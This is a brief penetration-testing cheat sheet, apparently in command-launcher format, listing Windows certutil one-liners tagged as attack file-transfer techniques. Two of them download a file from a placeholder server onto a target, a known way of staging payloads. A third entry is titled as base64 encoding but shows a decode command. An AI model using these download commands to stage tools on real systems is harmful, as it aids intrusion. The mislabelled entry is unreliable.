# certutil

% windows, certutil

## download with certutil
#plateform/windows #target/remote #cat/ATTACK/FILE_TRANSFERT 
```
certutil.exe -urlcache -split -f http://<server>/<FILE> <OUTFILE>
```

## download with  certutil (2)
#plateform/windows #target/remote #cat/ATTACK/FILE_TRANSFERT 
```
certutil.exe -verifyctl -f -split h http://<server>/<FILE> <OUTFILE>
```

## Encode in base64 with certutil 
#plateform/windows #target/local #cat/UTILS
```
certutil -decode enc.txt <FILE>
```
